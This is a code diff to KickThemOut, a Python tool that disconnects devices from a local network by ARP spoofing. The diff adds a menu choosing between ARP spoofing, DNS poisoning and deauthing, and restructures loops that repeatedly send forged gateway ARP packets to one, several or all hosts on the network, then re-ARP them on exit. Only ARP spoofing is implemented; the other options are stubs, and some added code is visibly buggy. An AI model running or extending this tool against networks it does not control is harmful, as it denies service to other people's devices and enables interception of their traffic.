@@ -68,6 +68,20 @@ def optionBanner():
 
 
 
+# display options
+def attackMethodBanner():
+    print('\nSelect attack method:\n')
+    sleep(0.2)
+    print('\t{0}[{1}1{2}]{3} ARP Spoofing {4}(default){5}').format(YELLOW, RED, YELLOW, WHITE, RED, WHITE)
+    sleep(0.2)
+    print('\t{0}[{1}2{2}]{3} DNS Poisoning').format(YELLOW, RED, YELLOW, WHITE)
+    sleep(0.2)
+    print('\t{0}[{1}3{2}]{3} Deauthing').format(YELLOW, RED, YELLOW, WHITE)
+    sleep(0.2)
+    print('\n\t{0}[{1}E{2}]{3} Exit KickThemOut\n').format(YELLOW, RED, YELLOW, WHITE)
+
+
+
 # initiate debugging process
 def runDebug():
     print("\n\n{0}WARNING! An unknown error has occurred, starting debug...{1}").format(RED, END)
@@ -162,9 +176,13 @@ def retrieveMACAddress(hosts):
 # non interactive attack vector
 def nonInteractiveAttack():
 
-    print("\n{0}nonInteractiveAttack{1} activated...{2}").format(RED, GREEN, END) 
+    print("\n{0}nonInteractiveAttack{1} activated...{2}").format(RED, GREEN, END)
 
     target = options.targets
+
+    if options.attack is None:
+        attackVector = 'ARP'
+
     print("\n{0}Targets: {1}" + ", ".join(target)).format(GREEN, END)
 
     print("\n{0}Spoofing started... {1}").format(GREEN, END)
@@ -172,41 +190,47 @@ def nonInteractiveAttack():
     defaultGatewayIP = getGatewayIP()
     defaultGatewayMac = retrieveMACAddress(defaultGatewayIP)
 
-    try:
-        while True:
-            # broadcast malicious ARP packets (10p/s)
-            for i in target:
-                ip_address = i
-                try:
-                    mac_address = retrieveMACAddress(ip_address)
-                except:
-                    print("\n{0}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{1}").format(RED, END)
-                    raise SystemExit
-
-                spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, ip_address, mac_address)
-            time.sleep(10)
-    except KeyboardInterrupt:
-        # re-arp targets on KeyboardInterrupt exception
-        print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
-        reArp = 1
-        while reArp != 10:
-            # broadcast ARP packets with legitimate info to restore connection
-            for i in target:
-                ip_address = i
-                try:
-                    mac_address = retrieveMACAddress(ip_address)
-                except:
-                    print("\n{0}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{1}").format(RED, END)
-                    raise SystemExit
-                try:
-                    spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, ip_address, mac_address)
-                except KeyboardInterrupt:
-                    pass
-                except:
-                    runDebug()
-            reArp += 1
-            time.sleep(0.5)
-        print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
+    if attackVector == 'ARP':
+        try:
+            while True:
+                # broadcast malicious ARP packets (10p/s)
+                for i in target:
+                    ip_address = i
+                    try:
+                        mac_address = retrieveMACAddress(ip_address)
+                    except:
+                        print("\n{0}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{1}").format(RED, END)
+                        raise SystemExit
+    
+                    try:
+                        spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, ip_address, mac_address)
+                    except KeyboardInterrupt:
+                        pass
+                    except:
+                        runDebug()
+                time.sleep(10)
+        except KeyboardInterrupt:
+            # re-arp targets on KeyboardInterrupt exception
+            print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
+            reArp = 1
+            while reArp != 10:
+                # broadcast ARP packets with legitimate info to restore connection
+                for i in target:
+                    ip_address = i
+                    try:
+                        mac_address = retrieveMACAddress(ip_address)
+                    except:
+                        print("\n{0}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{1}").format(RED, END)
+                        raise SystemExit
+                    try:
+                        spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, ip_address, mac_address)
+                    except KeyboardInterrupt:
+                        pass
+                    except:
+                        runDebug()
+                reArp += 1
+                time.sleep(0.5)
+            print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
 
 
 
@@ -251,27 +275,29 @@ def kickoneoff():
 
     print("\n{0}Target: {1}" + one_target_ip).format(GREEN, END)
 
-    print("\n{0}Spoofing started... {1}").format(GREEN, END)
-    try:
-        while True:
-            # broadcast malicious ARP packets (10p/s)
-            spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, one_target_ip, one_target_mac)
-            time.sleep(10)
-    except KeyboardInterrupt:
-        # re-arp target on KeyboardInterrupt exception
-        print("\n{0}Re-arping{1} target...{2}").format(RED, GREEN, END)
-        reArp = 1
-        while reArp != 10:
-            try:
-                # broadcast ARP packets with legitimate info to restore connection
-                spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
-            except KeyboardInterrupt:
-                pass
-            except:
-                runDebug()
-            reArp += 1
-            time.sleep(0.5)
-        print("{0}Re-arped{1} target successfully.{2}").format(RED, GREEN, END)
+    if attackVector == 'ARP':
+
+        print("\n{0}Spoofing started... {1}").format(GREEN, END)
+        try:
+            while True:
+                # broadcast malicious ARP packets (10p/s)
+                spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, one_target_ip, one_target_mac)
+                time.sleep(10)
+        except KeyboardInterrupt:
+            # re-arp target on KeyboardInterrupt exception
+            print("\n{0}Re-arping{1} target...{2}").format(RED, GREEN, END)
+            reArp = 1
+            while reArp != 10:
+                try:
+                    # broadcast ARP packets with legitimate info to restore connection
+                    spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
+                except KeyboardInterrupt:
+                    pass
+                except:
+                    runDebug()
+                reArp += 1
+                time.sleep(0.5)
+            print("{0}Re-arped{1} target successfully.{2}").format(RED, GREEN, END)
 
 
 
@@ -318,35 +344,37 @@ def kicksomeoff():
 
     print("\n{0}Targets: {1}" + some_ipList).format(GREEN, END)
 
-    print("\n{0}Spoofing started... {1}").format(GREEN, END)
-    try:
-        while True:
-            # broadcast malicious ARP packets (10p/s)
-            for i in some_targets:
-                ip = onlineIPs[int(i)]
-                for host in hostsList:
-                    if host[0] == ip:
-                        spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
-            time.sleep(10)
-    except KeyboardInterrupt:
-        # re-arp targets on KeyboardInterrupt exception
-        print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
-        reArp = 1
-        while reArp != 10:
-            # broadcast ARP packets with legitimate info to restore connection
-            for i in some_targets:
-                ip = onlineIPs[int(i)]
-                for host in hostsList:
-                    if host[0] == ip:
-                        try:
-                            spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
-                        except KeyboardInterrupt:
-                            pass
-                        except:
-                            runDebug()
-            reArp += 1
-            time.sleep(0.5)
-        print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
+    if attackVector == 'ARP':
+
+        print("\n{0}Spoofing started... {1}").format(GREEN, END)
+        try:
+            while True:
+                # broadcast malicious ARP packets (10p/s)
+                for i in some_targets:
+                    ip = onlineIPs[int(i)]
+                    for host in hostsList:
+                        if host[0] == ip:
+                            spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
+                time.sleep(10)
+        except KeyboardInterrupt:
+            # re-arp targets on KeyboardInterrupt exception
+            print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
+            reArp = 1
+            while reArp != 10:
+                # broadcast ARP packets with legitimate info to restore connection
+                for i in some_targets:
+                    ip = onlineIPs[int(i)]
+                    for host in hostsList:
+                        if host[0] == ip:
+                            try:
+                                spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
+                            except KeyboardInterrupt:
+                                pass
+                            except:
+                                runDebug()
+                reArp += 1
+                time.sleep(0.5)
+            print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
 
 
 
@@ -368,37 +396,39 @@ def kickalloff():
         vendor = resolveMac(mac)
         print(str("  {0}"+ str(onlineIPs[i]) + "{1}\t" + vendor + "{2}").format(RED, GREEN, END))
 
-    print("\n{0}Spoofing started... {1}").format(GREEN, END)
-    try:
-        # broadcast malicious ARP packets (10p/s)
-        reScan = 0
-        while True:
-            for host in hostsList:
-                if host[0] != defaultGatewayIP:
-                    # dodge gateway (avoid crashing network itself)
-                    spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
-            reScan += 1
-            if reScan == 4:
-                reScan = 0
-                scanNetwork()
-            time.sleep(10)
-    except KeyboardInterrupt:
-        print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
-        reArp = 1
-        while reArp != 10:
-            # broadcast ARP packets with legitimate info to restore connection
-            for host in hostsList:
-                if host[0] != defaultGatewayIP:
-                    try:
-                        # dodge gateway
-                        spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
-                    except KeyboardInterrupt:
-                        pass
-                    except:
-                        runDebug()
-            reArp += 1
-            time.sleep(0.5)
-        print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
+    if attackVector == 'ARP':
+
+        print("\n{0}Spoofing started... {1}").format(GREEN, END)
+        try:
+            # broadcast malicious ARP packets (10p/s)
+            reScan = 0
+            while True:
+                for host in hostsList:
+                    if host[0] != defaultGatewayIP:
+                        # dodge gateway (avoid crashing network itself)
+                        spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
+                reScan += 1
+                if reScan == 4:
+                    reScan = 0
+                    scanNetwork()
+                time.sleep(10)
+        except KeyboardInterrupt:
+            print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
+            reArp = 1
+            while reArp != 10:
+                # broadcast ARP packets with legitimate info to restore connection
+                for host in hostsList:
+                    if host[0] != defaultGatewayIP:
+                        try:
+                            # dodge gateway
+                            spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
+                        except KeyboardInterrupt:
+                            pass
+                        except:
+                            runDebug()
+                reArp += 1
+                time.sleep(0.5)
+            print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
 
 
 
@@ -511,7 +541,7 @@ def main():
         print("\n{0}Using interface '{1}" + defaultInterface + "{2}' with mac address '{3}" + defaultInterfaceMac + "{4}'.\nGateway IP: '{5}" + 
             defaultGatewayIP + "{6}' --> Target(s): '{7}" + ", ".join(options.targets) + "{8}'.{9}").format(GREEN, RED, GREEN, RED, GREEN, RED, GREEN, RED, GREEN, END)
 
-    if interactive:
+    if options.targets is None:
 
         try:
     
@@ -521,17 +551,95 @@ def main():
     
                 header = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
                 choice = raw_input(header)
+
+                global attackVector
     
                 if choice.upper() == 'E' or choice.upper() == 'EXIT':
                     print('\n{0}Thanks for dropping by.'
                           '\nCatch ya later!{1}').format(GREEN, END)
                     raise SystemExit
+
                 elif choice == '1':
-                    kickoneoff()
+                    if interactive and options.attack is None:
+                        attackMethodBanner()
+                        header2 = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
+                        choice = raw_input(header)
+                        if choice.upper() == 'E' or choice.upper() == 'EXIT':
+                            print('\n{0}Thanks for dropping by.'
+                                '\nCatch ya later!{1}').format(GREEN, END)
+                            raise SystemExit
+                        elif choice == '1':
+                            attackVector = 'ARP'
+                            kickoneoff()
+                        elif choice == '2':
+                            attackVector = 'DNS'
+                            kickoneoff()
+                        elif choice == '3':
+                            attackVector = 'DEAUTH'
+                            kickoneoff()
+                        else:
+                            print("\n{0}ERROR: Please select a valid option.{1}\n").format(RED, END)
+                    elif not interactive and options.attack is None:
+                        attackVector = 'ARP' # set arp spoof as default attack method
+                        kickoneoff()
+                    else:
+                        print("\n{0}ERROR: Something went terribly wrong. Please report this issue. {1}\n").format(RED, END)
+                        raise SystemExit
+
                 elif choice == '2':
-                    kicksomeoff()
+                    if interactive and options.attack is None:
+                        attackMethodBanner()
+                        header2 = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
+                        choice = raw_input(header)
+                        if choice.upper() == 'E' or choice.upper() == 'EXIT':
+                            print('\n{0}Thanks for dropping by.'
+                                '\nCatch ya later!{1}').format(GREEN, END)
+                            raise SystemExit
+                        elif choice == '1':
+                            attackVector = 'ARP'
+                            kicksomeoff()
+                        elif choice == '2':
+                            attackVector = 'DNS'
+                            kicksomeoff()
+                        elif choice == '3':
+                            attackVector = 'DEAUTH'
+                            kicksomeoff()
+                        else:
+                            print("\n{0}ERROR: Please select a valid option.{1}\n").format(RED, END)
+                    elif not interactive and options.attack is None:
+                        attackVector = 'ARP' # set arp spoof as default attack method
+                        kicksomeoff()
+                    else:
+                        print("\n{0}ERROR: Something went terribly wrong. Please report this issue. {1}\n").format(RED, END)
+                        raise SystemExit
+
                 elif choice == '3':
-                    kickalloff()
+                    if interactive and options.attack is None:
+                        attackMethodBanner()
+                        header2 = ('{0}kickthemout{1}> {2}'.format(BLUE, WHITE, END))
+                        choice = raw_input(header)
+                        if choice.upper() == 'E' or choice.upper() == 'EXIT':
+                            print('\n{0}Thanks for dropping by.'
+                                '\nCatch ya later!{1}').format(GREEN, END)
+                            raise SystemExit
+                        elif choice == '1':
+                            attackVector = 'ARP'
+                            kickalloff()
+                        elif choice == '2':
+                            attackVector = 'DNS'
+                            kickalloff()
+                        elif choice == '3':
+                            attackVector = 'DEAUTH'
+                            kickalloff()
+                        else:
+                            print("\n{0}ERROR: Please select a valid option.{1}\n").format(RED, END)
+                    elif not interactive and options.attack is None:
+                        attackVector = 'ARP' # set arp spoof as default attack method
+                        kickalloff()
+                    else:
+                        print("\n{0}ERROR: Something went terribly wrong. Please report this issue. {1}\n").format(RED, END)
+                        raise SystemExit
+
                 elif choice.upper() == 'CLEAR':
                     os.system("clear||cls")
                 else:
@@ -591,6 +699,25 @@ if __name__ == '__main__':
         
         # commence scanning process
         scanNetwork()
+
+
+        """
+        elif options.attack is None and option.targets is not None:
+    
+            # run non-interactively with arp-spoof attack (being default attack)
+            # (if not interactive and attack is None: attackVector = 'arp')
+            interactive = False
+    
+        elif options.attack is not None and options.targets is None:
+    
+            # run interactively (with scan) but don't ask for attack method (pass options.attack argument)
+            interactive = True
+            sys.stdout.write("{0}Scanning your network, hang on...{1}\r".format(GREEN, END))
+            sys.stdout.flush()
+            
+            # commence scanning process
+            scanNetwork()
+        """
 
     else:
 
